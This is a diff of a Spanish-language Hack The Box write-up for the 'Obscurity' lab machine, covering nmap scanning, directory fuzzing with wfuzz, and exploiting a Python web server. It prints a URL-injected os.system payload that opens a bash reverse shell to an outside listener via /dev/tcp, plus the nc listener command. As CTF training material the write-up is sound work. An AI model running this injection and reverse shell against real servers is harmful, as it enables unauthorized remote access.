@@ -7,7 +7,6 @@ author: "TheusZero"
 header-img: "images/post/Obscurity.png"
 catalog: true
 comments: true
-multilingual: true
 tags:
   - Linux
   - Machine
@@ -20,13 +19,17 @@ tags:
 
 # Obscurity
 
+Obscurity me parecio una maquina divertida.
+Su premisa consta de enumeracion basica, tanto en el **User** como en para el **Root**.
+
+Este **Writeup** consiste en el camino personal al que me someti para poder terminar la maquina, asi que espero que sea de su agrado.
+
 ## Enumeracion
 
 #### NMAP
-
+Comence por un simple nmap para buscar los puertos.
 ```vim
-┌─[zero@parrot]─[~/HTB/Machines/Obscurity]
-└──╼ $nmap -sC -sV 10.10.10.168 -o nmap.txt
+nmap -sC -sV 10.10.10.168 -o nmap.txt
 # Nmap 7.80 scan initiated Sat Mar 14 13:13:23 2020 as: nmap -sC -sV -o nmap.txt 10.10.10.168
 Nmap scan report for 10.10.10.168
 Host is up (0.22s latency).
@@ -73,64 +76,32 @@ PORT     STATE  SERVICE    VERSION
 |_http-server-header: BadHTTPServer
 |_http-title: 0bscura
 9000/tcp closed cslistener
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8080-TCP:V=7.80%I=7%D=3/14%Time=5E6D10C6%P=x86_64-pc-linux-gnu%r(Ge
-SF:tRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sat,\x2014\x20Mar\x2020
-SF:20\x2017:15:47\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sat,\x2014\
-SF:x20Mar\x202020\x2017:15:47\nContent-Length:\x204171\nContent-Type:\x20t
-SF:ext/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"
-SF:en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\
-SF:n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<
-SF:meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-s
-SF:cale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20na
-SF:me=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templ
-SF:ate\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20st
-SF:ylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boo
-SF:tstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-a
-SF:wesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templa
-SF:temo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target
-SF:=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<
-SF:div\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner
-SF:-wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20
-SF:Sat,\x2014\x20Mar\x202020\x2017:15:47\nServer:\x20BadHTTPServer\nLast-M
-SF:odified:\x20Sat,\x2014\x20Mar\x202020\x2017:15:47\nContent-Length:\x204
-SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20
-SF:html>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t
-SF:<title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20co
-SF:ntent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
-SF:ice-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conte
-SF:nt=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nE
-SF:asy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pro
-SF:file\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesh
-SF:eet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet
-SF:\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet
-SF:\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"
-SF:scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20
-SF:section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"s
-SF:k-spinner\x20sk-spinner-wordpress\">\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sat Mar 14 13:14:02 2020 -- 1 IP address (1 host up) scanned in 39.61 seconds
 ```
 
-El nmap nos muestra  2 posibles rutas, aunque por primera revise altiro el puerto 8080 ya que este es un html
+ Al tener ya la informacion sobre los puetos, fui de lleno al puerto **8080** ya que consta de un **HTML** con el cual quiza pueda sacar informacion.
 
-#### Web
+#### 8080 - 0bscura
 
-la web es simple, es importante leerla ya que nos da informacion de un suspuesto archivo.py que maneja el servidor.
+la web es simple, es importante leerla ya que nos da informacion de un suspuesto **archivo.py** que maneja el servidor.
+
+![](/TheusZero/images/post/obscurity/0bscura1.png)
 
 > SuperSecureServer.py
 
-Este se encuentra en un directorio secetro, asi que es hora de fuzzear el directorio :D
-
-> ┌─[zero@parrot]─[~/HTB/Machines/Obscurity]
-  └──╼ $wfuzz --hh=14 -c  -w /usr/share/dirb/wordlists/big.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
->> 000006016:   200        170 L    498 W    5892 Ch     "develop"
-
-ya tenemos el archivo.py, que lleva esto como code:
-
+Este se encuentra en un directorio **"secreto"**, asi que es hora de fuzzear el directorio.
 ```vim
+wfuzz --hh=14 -c  -w /usr/share/dirb/wordlists/big.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+
+000006016:   200        170 L    498 W    5892 Ch     "develop"
+```
+
+Con esto, ya tenemos el directorio donde se encuentra **SuperSecureServer.py**, que lleva esto como codigo lo siguiente:
+
+```Python
     import socket
     import threading
     from datetime import datetime
@@ -302,15 +273,25 @@ ya tenemos el archivo.py, que lleva esto como code:
             return {"body": data, "mime": mime, "status": status}
 ```
 
-el archivo me costo entenderlo, pero luego de un poco de ayuda logre cachar que esto explica que para el index.html se le pueden ingresar string que el sistema ejecuta como python, logrando asi introducir una reverse shell para entrar al system.
+El archivo cuesta entenderlo, 
+pero luego de leer un poco el codigo se logra divisar lo que debemos hacer.
 
-meti la pag a un burp, luego hice la reverse shell.
+Leyendo asi el codigo de **SuperSecureServer.py** se entiende que podemos inyectar codigo python mediante la url, asi que para evitar errores se abrio **BurpSuite** y se intento introducir una "Reverse Shell" de la siguiente manera:
+
+Primero se dejo un puerto en nuestra maquina a la escucha:
 
 > nc -lvp 4443
 
+
+#### BurpSuite and Reverse Shell
+
+Ahora mediante **BurpSuite** introducimos la reverse shell encodeada.
+
+![](/TheusZero/images/post/obscurity/Obscura4.png)
+
 ```vim
 GET /';os.system('bash%20-c%20"bash%20-i%20>&%20/dev/tcp/10.10.14.72/4443%200>&1"');a=' HTTP/1.1
-Host: 10.10.10.168:8080
+Host: 10.10.14.39:8080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -321,9 +302,11 @@ Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 ```
 
-listo, entre como www-data
+ya mandandado el request mediante el burp, obtenemos la reverse shell del user **www-data**
 
-## Robert
+![](/TheusZero/images/post/obscurity/Obscura3.png)
+
+## User - Robert
 
 este paso culiao me costo muxo, tuve que leer el codigo y entender que hacia cada cosa.
 
